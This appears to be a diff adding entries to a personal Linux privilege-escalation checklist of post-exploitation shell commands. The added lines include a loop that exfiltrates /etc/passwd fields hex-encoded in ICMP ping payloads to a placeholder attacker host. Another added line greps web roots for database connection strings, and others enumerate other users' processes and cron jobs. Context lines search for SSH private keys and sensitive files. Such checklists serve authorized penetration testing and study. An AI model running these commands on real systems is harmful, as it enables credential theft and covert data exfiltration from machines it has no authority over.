@@ -1,7 +1,13 @@
 # Linux Privilege Escalation Checklist
 
+# Exfiltrate users through ICMP
+while read line; do ping -c 1 -p $(echo "$line" | cut -d ":" -f 1,2,3,7 | xxd -ps) <my_attacking_host>; done < /etc/passwd
+
 # Check for useful tools
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp curl 2>/dev/null
+
+# Check for running processes of other users (not your current one)
+ps -elf | grep -v $(whoami)
 
 # Install Linenum.sh
 mkdir /tmp/linenum
@@ -35,6 +41,9 @@ find / -type f -iname *.rar   2>/dev/null
 find / -type f -iname *.docx  2>/dev/null
 find / -type f -iname *.sql   2>/dev/null
 
+egrep -ri '(mysql_connect\(|mysqli_connect\(|new mysqli\(|PDO\(\"mysql:)' /var/www/* 2> /dev/null
+
+
 Check: /etc/security/opasswd
 
 ## In-Memory Passwords
@@ -51,7 +60,13 @@ find / -name id_rsa 2> /dev/null
 ## Last Edited Files
 find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
+
+
 # Detect CRON jobs
+
+## List all cron jobs
+for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done
+
 ## print both commands and file system events and scan procfs every 1000 ms (=1sec)
 pspy64 -pf -i 1000 
 
